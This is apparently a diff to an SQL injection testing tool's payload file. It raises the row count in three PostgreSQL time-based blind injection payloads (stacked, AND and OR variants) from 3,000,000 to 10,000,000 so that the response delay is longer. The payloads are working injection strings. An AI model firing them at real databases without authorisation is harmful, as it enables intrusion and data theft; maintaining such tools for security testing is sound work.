@@ -1267,7 +1267,7 @@ Formats:
         <clause>0</clause>
         <where>1</where>
         <request>
-            <payload>; SELECT [RANDNUM] WHERE EXISTS(SELECT * FROM GENERATE_SERIES(1, 3000000));</payload>
+            <payload>; SELECT [RANDNUM] WHERE EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000));</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1503,7 +1503,7 @@ Formats:
         <clause>1,2,3</clause>
         <where>1</where>
         <request>
-            <payload>AND EXISTS(SELECT * FROM GENERATE_SERIES(1, 3000000))</payload>
+            <payload>AND EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1658,7 +1658,7 @@ Formats:
         <clause>1,2,3</clause>
         <where>2</where>
         <request>
-            <payload>OR EXISTS(SELECT * FROM GENERATE_SERIES(1, 3000000))</payload>
+            <payload>OR EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
